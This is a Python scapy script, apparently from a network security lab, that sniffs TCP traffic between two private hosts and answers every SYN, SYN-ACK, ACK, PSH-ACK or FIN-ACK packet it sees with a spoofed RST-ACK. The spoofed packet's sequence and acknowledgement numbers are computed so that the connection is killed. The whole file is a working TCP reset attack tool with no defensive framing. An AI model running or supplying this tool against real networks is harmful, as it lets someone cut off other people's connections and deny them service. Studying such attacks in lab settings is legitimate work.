from scapy.all import sniff, sendp, Ether, IP, TCP

SRC = "10.0.2.10"
DST = "10.0.2.20"

# Map TCP flag bits to names
FLAG_MEANINGS = {
    'F': 'FIN',
    'S': 'SYN',
    'R': 'RST',
    'P': 'PSH',
    'A': 'ACK',
    'U': 'URG',
    'E': 'ECE',
    'C': 'CWR',
}

# Store IP → MAC mapping
ip_to_mac = {}

def get_direction(src, dst):
    if src == SRC and dst == DST:
        return f"{SRC} → {DST}"
    elif src == DST and dst == SRC:
        return f"{DST} → {SRC}"
    else:
        return "other"

def parse_flags(tcp_flags):
    """Convert flag string into human-readable list"""
    return [FLAG_MEANINGS.get(flag, flag) for flag in str(tcp_flags)]

def send_layer2_packet(src_ip, src_port, dst_ip, dst_port, flags, seq, ack):
    if src_ip not in ip_to_mac or dst_ip not in ip_to_mac:
        print(f"Cannot send packet: Missing MAC address for {src_ip} or {dst_ip}")
        return

    ether = Ether(src=ip_to_mac[src_ip], dst=ip_to_mac[dst_ip])
    ip = IP(src=src_ip, dst=dst_ip)
    tcp = TCP(sport=src_port, dport=dst_port, flags=flags, seq=seq, ack=ack)

    packet = ether / ip / tcp
    sendp(packet, verbose=0)
    print(f"Sent {flags} from {src_ip}:{src_port} to {dst_ip}:{dst_port}")

def send_rst(src_ip, src_port, dst_ip, dst_port, seq, ack):
    send_layer2_packet(src_ip, src_port, dst_ip, dst_port, "RA", seq, ack)

def packet_handler(pkt):
    if pkt.haslayer(IP) and pkt.haslayer(TCP):
        ip = pkt[IP]
        tcp = pkt[TCP]

        # Save MAC addresses from sniffed packets
        if ip.src not in ip_to_mac:
            ip_to_mac[ip.src] = pkt.src
        if ip.dst not in ip_to_mac:
            ip_to_mac[ip.dst] = pkt.dst

        if {ip.src, ip.dst} == {SRC, DST}:
            direction = get_direction(ip.src, ip.dst)
            flags_list = parse_flags(tcp.flags)
            flags_set = set(flags_list)
            flags_str = ", ".join(flags_list)
            payload_len = len(tcp.payload)

            # Default values
            exp_seq = 0
            exp_ack = 0

            # Handle different cases based on flags
            if flags_set == {"SYN"}:
                exp_seq = 0  # No data sent yet
                exp_ack = tcp.seq + 1
                send_rst(SRC, tcp.dport, DST, tcp.sport, exp_seq, exp_ack)

            elif flags_set == {"SYN", "ACK"}:
                exp_seq = tcp.ack  # Server sending SYN-ACK, ack number is client's ISN +1
                exp_ack = tcp.seq + 1
                send_rst(SRC, tcp.dport, DST, tcp.sport, exp_seq, exp_ack)

            elif flags_set == {"ACK"}:
                exp_seq = tcp.ack  # Keep moving forward
                exp_ack = tcp.seq + payload_len
                send_rst(SRC, tcp.dport, DST, tcp.sport, exp_seq, exp_ack)

            elif flags_set == {"PSH", "ACK"}:
                exp_seq = tcp.ack
                exp_ack = tcp.seq + payload_len
                send_rst(SRC, tcp.dport, DST, tcp.sport, exp_seq, exp_ack)

            elif flags_set == {"FIN", "ACK"}:
                exp_seq = tcp.ack
                exp_ack = tcp.seq + 1
                send_rst(SRC, tcp.dport, DST, tcp.sport, exp_seq, exp_ack)

            else:
                print(f"Ignored unknown or unhandled TCP flags: {flags_str}")

print(f"Monitoring TCP packets between {SRC} and {DST}, handling SYN/SYN-ACK/ACK/PSH-ACK/FIN-ACK with RST-ACK response...")
sniff(filter=f"tcp and (host {SRC} or host {DST})", prn=packet_handler, store=0)
